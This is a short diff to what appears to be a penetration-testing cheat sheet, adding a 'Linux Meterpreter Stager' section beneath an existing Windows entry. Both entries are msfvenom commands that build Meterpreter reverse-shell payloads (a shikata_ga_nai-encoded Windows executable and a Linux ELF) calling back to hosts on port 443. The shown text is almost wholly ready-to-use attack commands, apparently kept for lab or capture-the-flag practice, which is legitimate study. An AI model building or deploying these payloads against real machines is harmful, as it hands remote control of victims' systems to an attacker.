@@ -62,3 +62,7 @@ Don't just copy and paste - learn and understand the syntax.  These will all be 
 
 `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -e x86/shikata_ga_nai -b '\x00' -f exe -o burmat.exe`
 
+### Linux Meterpreter Stager
+
+`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.11 LPORT=443 -f elf -o burmat`
+
